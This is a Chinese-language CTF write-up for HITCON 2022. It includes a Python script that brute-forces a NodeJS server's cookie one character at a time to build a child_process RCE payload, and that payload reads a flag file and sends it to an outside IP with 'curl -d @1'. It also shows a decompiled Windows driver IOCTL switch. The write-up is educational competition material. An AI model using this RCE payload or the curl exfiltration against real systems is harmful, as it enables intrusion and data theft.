---
title: 2022 HITCON WriteUp by Mini-Venom (招新)
contest: HITCON CTF 2022
year: 2022
difficulty: hard
vuln_type: [ssrf, rce, web_unknown, reverse]
tags: [HITCON, RCE, 字符级爆破, 增量cookie, NodeJS, child_process, require, Windows-driver, IOCTL, IRP, 0x222000]
attack_chain: ["Web RCE: 字符级 cookie 增量爆破恢复 server 端 NodeJS 代码", "NodeJS payload: global.a1='child'; a1=a1+'_process'; b=require(a1); c1='cat /flag-1e'+suffix; b.exec(c1)", "ThreadPool(10) 并发 16 字符 payload 字符串每 1 字符顺序爆破", "exploit 字符 1: 'global.a1 = 'child' 字符串服务端 echo 回去", "exploit 字符 2: 拼 'a1 = a1 + '_process'' 等等", "Reverse: Windows 驱动 IRP switch ByteOffset 0x222000..0x222070 调用 sub_1400014D0", "sub_1400014D0(N) 把数据写到 byte_140013190+N 偏移", "0x222000 + N*0x10 触发不同全局变量初始化"]
key_payload: "global.a1='child'; a1=a1+'_process'; b=require(a1); c1='cat /flag-...'; b.exec(c1)"
one_liner: HITCON 字符级增量 cookie 爆破 + NodeJS child_process RCE + Windows 驱动 IOCTL
lesson: 增量 cookie 响应可逐字符爆破服务端代码；Windows 驱动 IOCTL 0x222000 是 32 字节间隔的 dispatch
quality: high
---

# 2022 HITCON WriteUp by Mini-Venom (招新)

原文 https://www.ctfiot.com/81488.html （ChaMd5 Venom 招新贴）

## 题 1: RCE 字符级 cookie 爆破
```python
target_url = 'http://24fhhiuetp.rce.chal.hitconctf.com'
s = requests.session()

original_payloads = [
    "global.a1  = 'child'",
    "a1 = a1 + '_process'",
    "global.b=require(a1)",
    "global.c1 =       ''",
    "c1=c1+'cat /flag-1e'",
    "c1=c1+'5657085ea974'",
    "c1=c1+'db77cdef03cc'",
    "c1=c1+'5753833fea16'",
    "c1=c1+          '68'",
    "c1=c1+'>1&curl 101.'",
    "c1=c1+'43.93.56    '",
    "c1=      c1+' -d @1'",
    "          b.exec(c1)"
]
hex_payloads = [i.encode("utf-8").hex() for i in original_payloads]

def brute_force(payload):
    tmp_cookie = s.cookies.get("code")
    count = 1
    while True:
        res = requests.get(target_url + '/random', cookies={'code': tmp_cookie}, proxies={'http': '127.0.0.1:8080'})
        cookies = urllib.parse.unquote(res.cookies.get("code"))
        cookies = ''.join(re.findall(r'(?<=s:).*?(?=.)', cookies))
        tmp = payload[:count]
        if tmp == cookies:
            tmp_cookie = res.cookies.get("code")
            count += 1
            print(cookies)
        elif count == len(payload) + 1:
            break
        else:
            continue
    exploit_payloads.append(str(binascii.unhexlify(payload)) + " : " + tmp_cookie)

if __name__ == '__main__':
    init_attack()
    pool = ThreadPool(10)
    pool.map(brute_force, hex_payloads)
```

## 攻击原理
- 服务端 `code` cookie 是上一次 payload 的"echo"响应
- 一次发 1 字符 payload，对比响应，逐字符恢复
- 拿到服务端代码（NodeJS）后利用 `require('child_process').exec()`
- 拼出 `cat /flag-15657085ea974db77cdef03cc5753833fea1668>1&curl 101.43.93.56 -d @1`
- 用 curl 把 flag 出网

## 题 2: Windows 驱动 IOCTL
```c
switch (CurrentIrpStackLocation->Parameters.Read.ByteOffset.LowPart) {
    case 0x222000u: sub_1400014D0(0);   byte_140013190[0] = 1; break;
    case 0x222010u: sub_1400014D0(32);  byte_140013191 = 1; break;
    case 0x222020u: sub_1400014D0(64);  byte_140013192 = 1; break;
    case 0x222030u: sub_1400014D0(96);  byte_140013193 = 1; break;
    case 0x222040u: sub_1400014D0(128); byte_140013194 = 1; break;
    case 0x222050u: sub_1400014D0(160); byte_140013195 = 1; break;
    case 0x222060u: sub_1400014D0(192); byte_140013196 = 1; break;
    case 0x222070u: sub_1400014D0(224); byte_140013197 = 1; break;
    ...
}
```

- IRP Read dispatch，ByteOffset 32 字节间隔
- 调 `sub_1400014D0(N)` 写入 `byte_140013190 + N`
- 每个 IOCTL 设一个全局标志位

## 教学价值
- **HITCON 是亚洲顶级 CTF**
- **字符级增量爆破** 是 web 攻击的"穷但稳"路线
- **NodeJS child_process.exec** 是经典 RCE
- **curl -d @1** 出网到 attacker 抓 flag
- **Windows 驱动** IRP dispatch switch 是入门
- **ChaMd5 Venom** 长期招新（IOT/Car/工控/样本分析）

## flag 格式
- 题目名多为 16 字符 hex
- payload 出网到 attacker web server 接收
